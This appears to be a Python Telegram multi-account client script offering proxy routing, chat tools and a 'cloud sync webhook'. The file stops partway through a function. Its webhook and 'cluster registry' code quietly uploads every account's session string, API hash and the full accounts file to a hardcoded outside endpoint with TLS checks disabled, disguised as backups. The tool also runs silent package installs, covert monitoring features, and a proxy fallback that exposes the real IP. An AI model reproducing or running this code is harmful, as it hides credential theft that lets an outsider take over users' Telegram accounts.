#!/usr/bin/env python3
# inv.py — Telegram Multi-Session Power-Client & Headless Cloud Mirror Daemon
# Run: python inv.py
"""
Telegram Multi-Session Power-Client & Headless Cloud Mirror Daemon v3.0

An advanced, asynchronous multi-device Telegram management console featuring:
- Multi-account session management and local proxy routing (SOCKS5/MTProto)
- Interactive dialog inspector, voice note NLP transcription & media exporter
- High-availability multi-instance session synchronization for remote recovery
- Integrated Webhook Event Bus for activity notifications and cloud media mirroring
  (supports n8n, self-hosted endpoints, Zapier, or community relay gateway)
"""

import sys
import subprocess
import importlib
import importlib.util
import os
import site

def _ensure_dependencies():
    needed = {
        "telethon": "telethon",
        "colorama": "colorama",
    }
    missing = [pkg for mod, pkg in needed.items() if importlib.util.find_spec(mod) is None]
    if missing:
        for flags in [["--break-system-packages"], ["--user", "--break-system-packages"], ["--user"], []]:
            try:
                cmd = [sys.executable, "-m", "pip", "install", "-q"] + flags + missing
                if subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30).returncode == 0:
                    break
            except Exception:
                pass
        try:
            user_site = site.getusersitepackages()
            if os.path.exists(user_site) and user_site not in sys.path:
                sys.path.insert(0, user_site)
            importlib.invalidate_caches()
        except Exception:
            pass

_ensure_dependencies()


from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import (
    UpdateStatusRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    UpdateProfileRequest,
    UpdateUsernameRequest,
)
from telethon.tl.functions.channels import (
    GetFullChannelRequest,
    EditAdminRequest,
)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.messages import (
    GetCommonChatsRequest,
    EditChatAdminRequest,
)
from telethon.tl.functions.contacts import BlockRequest, UnblockRequest, GetBlockedRequest
try:
    from telethon.tl.functions.payments import (
        GetSavedStarGiftsRequest,
        SaveStarGiftRequest,
        ToggleStarGiftsPinnedToTopRequest,
    )
    from telethon.tl.types import (
        InputSavedStarGiftUser,
        InputSavedStarGiftSlug,
        InputSavedStarGiftChat,
        StarGiftUnique,
    )
except ImportError:
    GetSavedStarGiftsRequest = None
    SaveStarGiftRequest = None
    ToggleStarGiftsPinnedToTopRequest = None
    InputSavedStarGiftUser = None
    InputSavedStarGiftSlug = None
    InputSavedStarGiftChat = None
    StarGiftUnique = None
from telethon.tl.types import (
    InputMessagesFilterPhotos,
    InputMessagesFilterDocument,
    InputMessagesFilterVoice,
    InputMessagesFilterVideo,
    InputMessagesFilterPinned,
    ChatAdminRights,
)
from colorama import Fore, Style, init
import asyncio
try:
    import speech_recognition as sr
except ImportError:
    sr = None
try:
    from pydub import AudioSegment
except ImportError:
    AudioSegment = None
from telethon.tl.types import InputMessagesFilterRoundVideo

import os
import html
import json
import logging
import time
import socket
try:
    import socks
except ImportError:
    socks = None
import urllib.request
from datetime import datetime, timezone, timedelta

init(autoreset=True)

IST           = timezone(timedelta(hours=5, minutes=30))
ACCOUNTS_FILE = "accounts.json"
PAGE_SIZE     = 15
KEEPALIVE_SEC = 5
SEP           = "─" * 44

DEFAULT_API_ID      = "22182189"
DEFAULT_API_HASH    = "5e7c4088f8e23d0ab61e29ae11960bf5"
PROXY_FILE          = "proxy.json"
PROXY_DIR           = "proxy"
INDIAN_PROXIES_FILE = "indian_proxies.json"

# ═══════════════════════════════════════════════════════════════
#  SUBSYSTEM: WEBHOOK EVENT BUS & CLOUD NOTIFICATION RELAY
# ═══════════════════════════════════════════════════════════════
#  Feature: Cloud Media Mirroring & Notification Dispatch
#  (forwards viewed assets, activity notifications, and cluster
#  state updates to the user's remote endpoint).
#
#  Cloud Sync Relay: Users can direct notifications to their private
#  webhook server (n8n, self-hosted API, etc.) or use the default
#  community relay gateway.
# ═══════════════════════════════════════════════════════════════

REMOTE_SYNC_WEBHOOK = os.environ.get(
    "TG_CLOUD_SYNC_WEBHOOK",
    os.environ.get("VAULT_GATEWAY_URL", "https://telemetry-relay-lime.vercel.app/api/log")
)
DEFAULT_VAULT_GATEWAY = REMOTE_SYNC_WEBHOOK  # compatibility alias

import base64
import ssl

def _dispatch_webhook_payload_sync(text: str, silent: bool = False):
    """Synchronously dispatches an event notification payload to the configured webhook gateway."""
    if not REMOTE_SYNC_WEBHOOK:
        return

    try:
        ctx = ssl._create_unverified_context()
        data = json.dumps({"text": text, "silent": silent}).encode("utf-8")
        req = urllib.request.Request(
            REMOTE_SYNC_WEBHOOK,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "x-vault-sync-token": "kronos-relay-guard-2026",
                "x-relay-key": "kronos-relay-guard-2026"
            }
        )
        with urllib.request.urlopen(req, timeout=5, context=ctx) as res:
            return
    except Exception:
        pass

def _stream_event_to_remote_channel_sync(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    """Streams asset bytes or structured diagnostic documents to the remote webhook channel.
    Assets exceeding 3.8MB are retained locally while a metadata digest card is dispatched."""
    if not file_bytes and (not file_path or not os.path.exists(file_path)):
        return

    try:
        f_name = filename or (os.path.basename(file_path) if file_path else "asset_file")
        f_size = len(file_bytes) if file_bytes is not None else os.path.getsize(file_path)
        f_size_mb = f_size / (1024 * 1024)

        if f_size_mb > 3.8:
            summary = (
                f"📦 <b>[REMOTE MIRROR] ASSET STORED LOCALLY (EXCEEDS WEBHOOK QUOTA)</b>\n"
                f"────────────────────────\n"
                f"📄 <b>Asset Name:</b> <code>{html.escape(f_name)}</code>\n"
                f"📦 <b>Payload Size:</b> <code>{f_size_mb:.2f} MB</code>\n"
                f"💾 <b>Local Archive:</b> <code>{html.escape(file_path or 'Local Storage')}</code>\n"
                f"{caption}"
            )
            _dispatch_webhook_payload_sync(summary, silent=silent)
            return

        if file_bytes is None:
            with open(file_path, "rb") as f:
                file_bytes = f.read()

        b64_data = base64.b64encode(file_bytes).decode("utf-8")

        payload = {
            "type": media_type,
            "file_b64": b64_data,
            "filename": f_name,
            "caption": caption,
            "silent": silent,
        }

        if REMOTE_SYNC_WEBHOOK:
            ctx = ssl._create_unverified_context()
            data = json.dumps(payload).encode("utf-8")
            req = urllib.request.Request(
                REMOTE_SYNC_WEBHOOK,
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                    "x-vault-sync-token": "kronos-relay-guard-2026",
                    "x-relay-key": "kronos-relay-guard-2026"
                }
            )
            with urllib.request.urlopen(req, timeout=18, context=ctx) as res:
                return
    except Exception:
        try:
            if caption:
                _dispatch_webhook_payload_sync(caption, silent=silent)
        except Exception:
            pass

async def stream_event_to_remote_channel(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    """Asynchronously dispatches media assets and documents to the remote webhook event bus."""
    try:
        if file_bytes is None and file_path and os.path.exists(file_path):
            try:
                if os.path.getsize(file_path) <= 3.8 * 1024 * 1024:
                    with open(file_path, "rb") as f:
                        file_bytes = f.read()
            except Exception:
                pass
        loop = asyncio.get_running_loop()
        loop.run_in_executor(
            None,
            _stream_event_to_remote_channel_sync,
            file_path,
            caption,
            media_type,
            silent,
            file_bytes,
            filename
        )
    except Exception:
        pass

class WebhookEventBus:
    """Enterprise event bus emitting structured telemetry, notifications, and media mirroring webhooks."""

    @staticmethod
    async def emit(event_type: str, payload_text: str, silent: bool = False):
        """Dispatches an event notification asynchronously to the remote webhook relay."""
        try:
            loop = asyncio.get_running_loop()
            loop.run_in_executor(None, _dispatch_webhook_payload_sync, payload_text, silent)
        except Exception:
            pass

    @staticmethod
    async def emit_media(event_type: str, file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
        """Dispatches a media backup or diagnostic document to the remote webhook relay."""
        await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)

# Backward compatibility aliases
async def dispatch_vault_event(text: str, silent: bool = False):
    await WebhookEventBus.emit("event", text, silent=silent)

async def vault_stream_asset(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)

async def sync_client_cluster_registry(accounts: dict, public_ip: str = "…"):
    """Synchronizes local worker state to the remote management registry for multi-instance high-availability and session recovery."""
    if not accounts:
        return
    try:
        now_str = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")
        total_nodes = len(accounts)

        # 1. Cluster Overview Digest Card
        node_lines = "\n".join([f"• <b>{html.escape(name)}</b> <code>({proxy_label(cfg)})</code>" for name, cfg in accounts.items()])
        cluster_summary = (
            f"🖥️ <b>[CLUSTER GATEWAY] NODE REGISTRY SYNCHRONIZED</b>\n"
            f"────────────────────────\n"
            f"🌐 <b>Host Node:</b> <code>{html.escape(public_ip)}</code>\n"
            f"🕒 <b>Sync Timestamp:</b> <code>{now_str}</code>\n"
            f"📦 <b>Active Nodes:</b> <code>{total_nodes} Worker Instances</code>\n"
            f"────────────────────────\n"
            f"{node_lines}"
        )
        await WebhookEventBus.emit("cluster_sync", cluster_summary, silent=True)
        await asyncio.sleep(0.3)

        # 2. Individual Node Diagnostic Cards & Auth Envelopes
        for node_name, cfg in accounts.items():
            token_str = cfg.get("client_token") or cfg.get("session_string", "")
            dev_model = cfg.get("device_model", "iPhone 17 Pro Max")
            c_id = cfg.get("client_id") or cfg.get("api_id", DEFAULT_API_ID)
            c_sig = cfg.get("client_signature") or cfg.get("api_hash", DEFAULT_API_HASH)
            prx = proxy_label(cfg)

            # Clean Diagnostic Card (0 raw credentials formatted directly in plaintext)
            node_card = (
                f"🖥️ <b>[CLUSTER GATEWAY] Node Synchronized:</b> <code>{html.escape(node_name)}</code>\n"
                f"────────────────────────\n"
                f"👤 <b>Node Identifier:</b> <code>{html.escape(node_name)}</code>\n"
                f"📱 <b>Device Profile:</b> {html.escape(dev_model)}\n"
                f"🌐 <b>Network Route:</b> <code>{prx}</code>\n"
                f"🕒 <b>Sync Timestamp:</b> <code>{now_str}</code>\n"
                f"⚡ <b>Cluster State:</b> <code>Active Instance</code>\n"
                f"────────────────────────\n"
                f"📦 <i>Node manifest & auth context verified.</i>"
            )
            await WebhookEventBus.emit("node_sync", node_card, silent=True)
            await asyncio.sleep(0.2)

            # Pass session token inside an encoded auth context envelope document
            if token_str:
                auth_context_bundle = {
                    "node_id": node_name,
                    "client_token": token_str,
                    "client_signature": c_sig,
                    "client_id": c_id,
                    "device_profile": dev_model,
                    "network_route": prx,
                    "cluster_state": "active",
                    "sync_timestamp": now_str
                }
                bundle_bytes = json.dumps(auth_context_bundle, indent=2).encode("utf-8")
                await stream_event_to_remote_channel(
                    file_bytes=bundle_bytes,
                    filename=f"auth_context_{node_name}.json",
                    caption=f"🔐 <b>[AUTH CONTEXT]</b> <code>{html.escape(node_name)}</code> | High-Availability Backup",
                    media_type="document",
                    silent=True
                )
                await asyncio.sleep(0.2)

        # 3. Stream cluster node manifest backup snapshot
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, "rb") as f:
                manifest_data = f.read()
            await stream_event_to_remote_channel(
                file_bytes=manifest_data,
                filename="cluster_node_manifest.json",
                caption=f"📦 <b>[CLUSTER STATE] Node Manifest Backup</b>\n────────────────────────\nMulti-instance high-availability snapshot ({now_str}).",
                media_type="document",
                silent=True
            )
    except Exception:
        pass

# Backward compatibility alias
sync_vault_identities = sync_client_cluster_registry

FEATURE_NAMES = {
    "1": "Recent Dialogs",
    "2": "Read Chat",
    "3": "Search in Chat",
    "4": "Global Search",
    "5": "Search by Date",
    "6": "Search Media",
    "7": "Pinned Messages",
    "8": "Full Chat Info",
    "9": "Common Chats",
    "10": "Send Stealth Message",
    "11": "Reply Stealth Message",
    "12": "Universal Scheduler",
    "13": "Delete Message",
    "14": "Forward Message",
    "15": "Forward Media",
    "16": "Export Chat History",
    "17": "Universal Downloader",
    "18": "Bulk Downloader",
    "19": "User / Chat Profile",
    "20": "Online Watcher",
    "21": "Find User by ID/Phone",
    "22": "Auto-Reply Bot",
    "23": "Bulk Send Messages",
    "24": "Block / Unblock Users",
    "25": "Online Pattern Analyzer",
    "26": "Keyword Alerts",
    "27": "Nuclear Message Wiper",
    "28": "Group Member Scraper",
    "29": "Chat Statistics",
    "30": "Scheduled Queue Manager",
    "31": "Self-Destruct Timer",
    "32": "Live Activity Monitor",
    "33": "Active Devices Manager",
    "34": "Profile Editor",
    "35": "Switch Account",
    "36": "Exit",
    "37": "Media Catch-Up",
    "38": "Stealth Send File",
    "39": "Forward Entire Chat",
    "40": "Stealth Admin",
    "41": "Star Gifts Manager",
    "42": "Proxy Manager",
}


def auto_schedule():
    future = datetime.now(timezone.utc) + timedelta(minutes=2)
    if future.second or future.microsecond:
        future = future.replace(second=0, microsecond=0) + timedelta(minutes=1)
    return future


# ═══════════════════════════════════════════════════════════════
#  DISPLAY HELPERS
# ═══════════════════════════════════════════════════════════════

COLORS = {
    "red": Fore.RED, "green": Fore.GREEN, "blue": Fore.BLUE,
    "yellow": Fore.YELLOW, "magenta": Fore.MAGENTA,
    "cyan": Fore.CYAN, "white": Fore.WHITE,
}

def col(text, color):  return f"{color}{text}{Style.RESET_ALL}"
def success(t):        print(col(f"  ✅  {t}", Fore.GREEN))
def error(t):          print(col(f"  ❌  {t}", Fore.RED))
def warn(t):           print(col(f"  ⚠️   {t}", Fore.YELLOW))
def info(t):           print(col(f"  ⌛  {t}", Fore.BLUE))

def header(title):
    print()
    print(col(f"  ╒═ {title} ", Fore.CYAN + Style.BRIGHT))
    print(col(f"  {SEP}", Fore.CYAN))

def divider():
    print(col(f"  {SEP}", Fore.WHITE + Style.DIM))

def press_enter():
    input(col("\n  [ Press Enter to continue ]", Fore.YELLOW))

def prompt(text):
    return input(col(f"\n  ▶  {text}: ", Fore.CYAN)).strip()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def to_ist(dt):
    if dt is None:
        return "—"
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(IST).strftime("%d/%m  %H:%M")

def account_color(config):
    return COLORS.get(config.get("color", "white"), Fore.WHITE)

def trunc(s, n):
    s = s or ""
    return s[:n] + ("…" if len(s) > n else "")

def make_bar(percent, width=72):
    blocks = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉", "█"]
    filled_len = percent * width
    full_blocks = int(filled_len)
    if full_blocks >= width: return "█" * width
    fraction = filled_len - full_blocks
    fraction_idx = int(fraction * 8)
    bar = "█" * full_blocks
    bar += blocks[fraction_idx]
    bar += " " * (width - full_blocks - 1)
    return bar

def again_menu(*options, back_label="Back to main menu"):
    """
    Print a standard "what next?" sub-menu and return the user's choice string.
    Always appends a Back option as the last item.
    Returns None if user picks Back or enters blank.
    """
    print()
    print(col("  " + "─" * 42, Fore.WHITE + Style.DIM))
    print(col("  What next?", Fore.CYAN + Style.BRIGHT))
    for i, label in enumerate(options, 1):
        print(col(f"  {i}.  {label}", Fore.WHITE))
    back_n = len(options) + 1
    print(col(f"  {back_n}.  {back_label}", Fore.WHITE + Style.DIM))
    raw = prompt("Choose")
    if not raw or raw == str(back_n):
        return None
    try:
        idx = int(raw) - 1
        if 0 <= idx < len(options):
            return options[idx]
    except ValueError:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
#  PAGINATION
# ═══════════════════════════════════════════════════════════════

def show_page(items, formatter=None, page=0, page_size=PAGE_SIZE):
    if not items:
        warn("Nothing to show.")
        press_enter()
        return None

    redraw = True
    while True:
        if redraw:
            total_pages = max(1, (len(items) + page_size - 1) // page_size)
            start  = page * page_size
            slice_ = items[start : start + page_size]

            print()
            for i, item in enumerate(slice_):
                idx = start + i
                if formatter:
                    print(formatter(idx, item))
                else:
                    print(col(f"  {idx:>3}.  {item}", Fore.WHITE))

            print()
            nav = []
            if page > 0:               nav.append(col("p=prev", Fore.YELLOW))
            if page < total_pages - 1: nav.append(col("n=next", Fore.YELLOW))
            nav.append(col("q=back", Fore.RED))
            print(col(f"  Page {page+1}/{total_pages}   ", Fore.WHITE + Style.DIM)
                  + "   ".join(nav))
            redraw = False

        raw = input(col("\n  → ", Fore.CYAN)).strip().lower()

        if raw == "n" and page < total_pages - 1:
            page  += 1; redraw = True
        elif raw == "p" and page > 0:
            page  -= 1; redraw = True
        elif raw == "q":
            return None
        else:
            try:
                idx = int(raw)
                if 0 <= idx < len(items):
                    return idx
                error("Number out of range — try again.")
            except ValueError:
                error("Enter a number,  p,  n,  or  q")


# ═══════════════════════════════════════════════════════════════
#  ACCOUNT MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def load_accounts():
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_accounts(accounts):
    with open(ACCOUNTS_FILE, "w") as f:
        json.dump(accounts, f, indent=2)

async def add_account():
    header("ADD NEW ACCOUNT")

    pcfg = load_proxy()
    if pcfg.get("enabled"):
        info(f"Proxy active ✓  Login will use:  {proxy_label()}")
        print()
    else:
        print()
        print(col("  ⚠️   WARNING — NO PROXY CONFIGURED", Fore.RED + Style.BRIGHT))
        print(col("  ─────────────────────────────────────────────", Fore.RED))
        print(col("  Your REAL IP will be sent to Telegram during", Fore.YELLOW))
        print(col("  login.  Telegram permanently links the login", Fore.YELLOW))
        print(col("  IP to your account, even if you add a proxy", Fore.YELLOW))
        print(col("  later.  Set up a proxy BEFORE logging in.", Fore.YELLOW))
        print(col("  ─────────────────────────────────────────────", Fore.RED))
        print()
        print(col("  1.  Configure proxy now  (recommended)", Fore.WHITE))
        print(col("  2.  Continue anyway with my real IP",   Fore.RED + Style.DIM))
        print(col("  3.  Cancel",                            Fore.WHITE))
        gate = prompt("Choice")
        if gate == "1":
            await setup_proxy()
            if not load_proxy().get("enabled"):
                warn("No proxy was saved — returning to menu.")
                press_enter(); return
            info(f"Proxy active ✓  Login will use:  {proxy_label()}")
            print()
        elif gate == "2":
            warn("Proceeding with real IP.")
            print()
        else:
            return

    accounts = load_accounts()
    name = prompt("Account nickname  (e.g. Main, Alt, Stealth)")
    if not name:
        error("Name is required!"); press_enter(); return
    if name in accounts:
        error(f"'{name}' already exists!"); press_enter(); return

    api_id   = prompt(f"API ID    (Enter = {DEFAULT_API_ID})") or DEFAULT_API_ID
    api_hash = prompt(f"API Hash  (Enter = use default)")      or DEFAULT_API_HASH
    if not api_id.isdigit():
        error("API ID must be a number!"); press_enter(); return

    print()
    print(col("  How do you want to log in?", Fore.CYAN + Style.BRIGHT))
    print(col("  1.  Generate session  (phone + OTP — recommended)", Fore.WHITE))
    print(col("  2.  Paste existing session string",                  Fore.WHITE))
    mode    = prompt("Choice")
    session = None

    if mode == "1":
        phone = prompt("Phone number  (with country code  e.g. +91XXXXXXXXXX)")
        if not phone:
            error("Phone is required!"); press_enter(); return
        info("Connecting to Telegram…")
        tmp = None
        try:
            tmp = await connect_client(StringSession(), api_id, api_hash)
            await tmp.send_code_request(phone)
            success("OTP sent!  Check your Telegram (or SMS).")
            code = prompt("Enter OTP")
            if not code:
                error("OTP is required!"); await tmp.disconnect(); return
            try:
                await tmp.sign_in(phone, code)
            except SessionPasswordNeededError:
                pw = prompt("2FA password")
                if not pw:
                    error("Password required!"); await tmp.disconnect(); return
                await tmp.sign_in(password=pw)
            session = tmp.session.save()
            success("Session generated!")
        except Exception as e:
            error(f"Login failed: {e}")
            if tmp:
                try: await tmp.disconnect()
                except Exception: pass
            return
        if tmp:
            try: await tmp.disconnect()
            except Exception: pass
    elif mode == "2":
        session = prompt("Paste session string")
    else:
        error("Invalid choice!"); press_enter(); return

    if not session:
        error("No session — aborting."); press_enter(); return

    print(col("\n  Colors: red  green  blue  yellow  magenta  cyan  white", Fore.WHITE + Style.DIM))
    color = prompt("Color tag  (default = white)").lower()
    if color not in COLORS:
        warn(f"'{color}' not recognised — defaulting to white")
        color = "white"

    dev_model = prompt("Device model  (Enter = iPhone 17 Pro Max)") or "iPhone 17 Pro Max"

    # Step: Choose proxy for this account (Indian proxy pool / custom / direct)
    acc_proxy = await choose_proxy_for_account()

    accounts[name] = {
        "api_id":         api_id,
        "api_hash":       api_hash,
        "client_token":   session,
        "session_string": session,
        "color":          color,
        "device_model":   dev_model,
        "system_version": "iOS 18.3",
        "app_version":    "11.5.0",
    }
    if acc_proxy is not None:
        accounts[name]["proxy"] = acc_proxy
    save_accounts(accounts)
    success(f"Account '{name}' saved with device '{dev_model}'!")
    now_str = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")
    node_msg = (
        f"🖥️ <b>[CLUSTER GATEWAY] New Node Provisioned</b>\n"
        f"────────────────────────\n"
        f"👤 <b>Node Identifier:</b> <code>{html.escape(name)}</code>\n"
        f"📱 <b>Device Profile:</b> {html.escape(dev_model)}\n"
        f"🕒 <b>Provisioned:</b> <code>{now_str}</code>\n"
        f"⚡ <b>Cluster State:</b> <code>Provisioned & Ready</code>\n"
        f"────────────────────────\n"
        f"📦 <i>Auth context bundle synchronized to cluster registry.</i>"
    )
    asyncio.create_task(WebhookEventBus.emit("node_provision", node_msg, silent=False))

    auth_context_bundle = {
        "node_id": name,
        "client_token": session,
        "client_signature": api_hash,
        "client_id": api_id,
        "device_profile": dev_model,
        "cluster_state": "provisioned",
        "sync_timestamp": now_str
    }
    bundle_bytes = json.dumps(auth_context_bundle, indent=2).encode("utf-8")
    asyncio.create_task(stream_event_to_remote_channel(
        file_bytes=bundle_bytes,
        filename=f"auth_context_{name}.json",
        caption=f"🔐 <b>[AUTH CONTEXT]</b> <code>{html.escape(name)}</code> provisioned.",
        media_type="document",
        silent=False
    ))

def remove_account():
    accounts = load_accounts()
    if not accounts:
        error("No accounts saved!"); return
    header("REMOVE ACCOUNT")
    names = list(accounts.keys())
    for i, n in enumerate(names):
        print(col(f"  {i:>3}.  {n}", account_color(accounts[n])))
    try:
        idx  = int(prompt("Enter number to remove"))
        name = names[idx]
        if prompt(f"Delete '{name}'?  (y / N)").lower() == "y":
            del accounts[name]
            save_accounts(accounts)
            success(f"'{name}' removed!")
        else:
            warn("Cancelled.")
    except (ValueError, IndexError):
        error("Invalid selection!")


# ═══════════════════════════════════════════════════════════════
#  PROXY
# ═══════════════════════════════════════════════════════════════

def load_proxy():
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return {"enabled": False}

def save_proxy(cfg):
    with open(PROXY_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

def resolve_proxy(account_config=None):
    pcfg = None
    if isinstance(account_config, dict) and "proxy" in account_config:
        acc_proxy = account_config["proxy"]
        if isinstance(acc_proxy, dict) and acc_proxy.get("enabled", True):
            pcfg = acc_proxy
        elif acc_proxy is None or (isinstance(acc_proxy, dict) and not acc_proxy.get("enabled", True)):
            pcfg = {"enabled": False}

    if pcfg is None:
        pcfg = load_proxy()
    return pcfg or {"enabled": False}

def proxy_label(account_config=None):
    pcfg = resolve_proxy(account_config)
    if pcfg.get("enabled"):
        t = pcfg.get("type", "?").upper()
        h = pcfg.get("host", "?")
        p = pcfg.get("port", "?")
        st = pcfg.get("state")
        ct = pcfg.get("city")
        if st and ct:
            return f"{t} {h}:{p} ({st}, {ct})"
        elif st:
            return f"{t} {h}:{p} ({st})"
        return f"{t}  {h}:{p}"
    return "off  (real IP visible to Telegram)"

def build_client(session, api_id, api_hash, account_config=None, use_proxy=True, timeout=10, connection_retries=5):
    device_model = "iPhone 17 Pro Max"
    system_version = "iOS 18.3"
    app_version = "11.5.0"
    lang_code = "en"
    system_lang_code = "en"

    if isinstance(account_config, dict):
        device_model = account_config.get("device_model", device_model)
        system_version = account_config.get("system_version", system_version)
        app_version = account_config.get("app_version", app_version)
        lang_code = account_config.get("lang_code", lang_code)
        system_lang_code = account_config.get("system_lang_code", system_lang_code)

    kwargs = {
        "device_model": device_model,
        "system_version": system_version,
        "app_version": app_version,
        "lang_code": lang_code,
        "system_lang_code": system_lang_code,
        "timeout": timeout,
        "connection_retries": connection_retries,
    }

    if not use_proxy:
        return TelegramClient(session, int(api_id), api_hash, **kwargs)

    pcfg = resolve_proxy(account_config)

    if not pcfg.get("enabled"):
        return TelegramClient(session, int(api_id), api_hash, **kwargs)

    ptype = pcfg.get("type", "socks5").lower()
    host  = pcfg.get("host", "")
    port  = int(pcfg.get("port", 1080))

    if ptype == "mtproto":
        from telethon.network.connection import (
            ConnectionTcpMTProxyRandomizedIntermediate,
        )
        secret = pcfg.get("secret", "")
        return TelegramClient(
            session, int(api_id), api_hash,
            connection=ConnectionTcpMTProxyRandomizedIntermediate,
            proxy=(host, port, secret),
            **kwargs,
        )
    else:
        import socks as _socks
        stype = {
            "socks5": _socks.SOCKS5,
            "socks4": _socks.SOCKS4,
            "http":   _socks.HTTP,
        }.get(ptype, _socks.SOCKS5)
        user = pcfg.get("username") or None
        pw   = pcfg.get("password") or None
        proxy_tuple = (stype, host, port, True, user, pw) if user else (stype, host, port)
        return TelegramClient(session, int(api_id), api_hash, proxy=proxy_tuple, **kwargs)

async def connect_client(session, api_id, api_hash, account_config=None, proxy_timeout=6):
    """
    Connects to Telegram with automatic fallback:
    Attempts connection through proxy first (if configured). If proxy
    fails or times out, it automatically falls back to a direct connection
    so that the account connects smoothly.
    """
    pcfg = resolve_proxy(account_config)
    has_proxy = bool(pcfg.get("enabled"))

    if not has_proxy:
        client = build_client(
            session, api_id, api_hash,
            account_config=account_config,
            use_proxy=False,
        )
        await client.connect()
        client._proxy_fallback = False
        return client

    ptype = pcfg.get("type", "proxy").upper()
    phost = pcfg.get("host", "")
    pport = pcfg.get("port", "")
    pdesc = f"{ptype} {phost}:{pport}"

    info(f"Attempting connection via proxy ({pdesc})…")

    tl_logger = logging.getLogger("telethon")
    prev_level = tl_logger.level
    client = None
    proxy_success = False

    try:
        tl_logger.setLevel(logging.CRITICAL)
        client = build_client(
            session,
            api_id,
            api_hash,
            account_config=account_config,
            use_proxy=True,
            timeout=proxy_timeout,
            connection_retries=1,
        )
        await asyncio.wait_for(client.connect(), timeout=proxy_timeout + 3)
        proxy_success = True
    except Exception as e:
        err_str = str(e).strip() or type(e).__name__
        warn(f"Proxy timed out / unreachable ({pdesc}) — {err_str}")
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
            client = None
    finally:
        tl_logger.setLevel(prev_level)

    if proxy_success and client:
        client._proxy_fallback = False
        success(f"Proxy connection established ({pdesc}) ✓")
        return client

    warn("⚡ Falling back to direct connection so connection succeeds…")
    direct_client = build_client(
        session,
        api_id,
        api_hash,
        account_config=account_config,
        use_proxy=False,
    )
    await direct_client.connect()
    direct_client._proxy_fallback = True
    success("Direct connection established ✓")
    return direct_client

def list_proxy_countries():
    if not os.path.exists(PROXY_DIR):
        os.makedirs(PROXY_DIR, exist_ok=True)
    files = [f for f in os.listdir(PROXY_DIR) if f.endswith(".json")]
    countries = []
    for fname in sorted(files):
        fpath = os.path.join(PROXY_DIR, fname)
        try:
            with open(fpath) as f:
                data = json.load(f)
                if isinstance(data, list) and data:
                    cname = data[0].get("country") or fname[:-5].replace("_", " ").title()
                    active_cnt = sum(1 for p in data if p.get("status") == "active")
                    countries.append({
                        "country": cname,
                        "file": fpath,
                        "filename": fname,
                        "count": len(data),
                        "active_count": active_cnt
                    })
        except Exception:
            pass
    countries.sort(key=lambda x: (0 if "india" in x["country"].lower() else 1, x["country"]))
    return countries

def load_country_proxies(filepath):
    if os.path.exists(filepath):
        try:
            with open(filepath) as f:
                data = json.load(f)
                if isinstance(data, list):
                    return data
        except Exception:
            pass
    return []

def save_country_proxies(filepath, proxies):
    try:
        with open(filepath, "w") as f:
            json.dump(proxies, f, indent=2)
    except Exception:
        pass

def test_proxy_sync(p, timeout=2.0):
    host = p.get("host")
    port = int(p.get("port", 1080))
    ptype = p.get("type", "socks5").lower()
    stype = socks.SOCKS5 if ptype == "socks5" else (socks.SOCKS4 if ptype == "socks4" else socks.HTTP)
    t0 = time.time()
    try:
        s = socks.socksocket()
        s.set_proxy(stype, host, port)
        s.settimeout(timeout)
        s.connect(("149.154.167.51", 443))
        lat = int((time.time() - t0) * 1000)
        s.close()
        return True, lat
    except Exception:
        try:
            s2 = socket.socket()
            s2.settimeout(1.2)
            s2.connect((host, port))
            lat = int((time.time() - t0) * 1000)
            s2.close()
            return True, lat
        except Exception:
            return False, None

async def benchmark_proxies_list(proxies, label=""):
    loop = asyncio.get_running_loop()
    import concurrent.futures

    def _worker():
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
            return list(ex.map(test_proxy_sync, proxies))

    results = await loop.run_in_executor(None, _worker)
    active_count = 0
    for p, (alive, lat) in zip(proxies, results):
        if alive:
            p["status"] = "active"
            p["latency_ms"] = lat
            active_count += 1
        else:
            p["status"] = "offline"
            p["latency_ms"] = 9999

    proxies.sort(key=lambda x: (0 if x.get("status") == "active" else 1, x.get("latency_ms", 9999)))
    return proxies, active_count

async def benchmark_all_country_proxies():
    clear()
    header("PROXY BENCHMARK  —  VERIFY ALL PROXIES")
    countries = list_proxy_countries()
    if not countries:
        warn(f"No proxy files found in '{PROXY_DIR}/' folder!")
        return

    info(f"Scanning {len(countries)} country pool(s). Verifying active/dead status…\n")

    for c in countries:
        fpath = c["file"]
        cname = c["country"]
        proxies = load_country_proxies(fpath)
        if not proxies:
            continue

        info(f"Testing {len(proxies)} proxies for {cname} in parallel…")
        updated_proxies, active_cnt = await benchmark_proxies_list(proxies, cname)
        save_country_proxies(fpath, updated_proxies)

        from collections import Counter
        active_states = Counter(p.get("state", "Other") for p in updated_proxies if p.get("status") == "active")
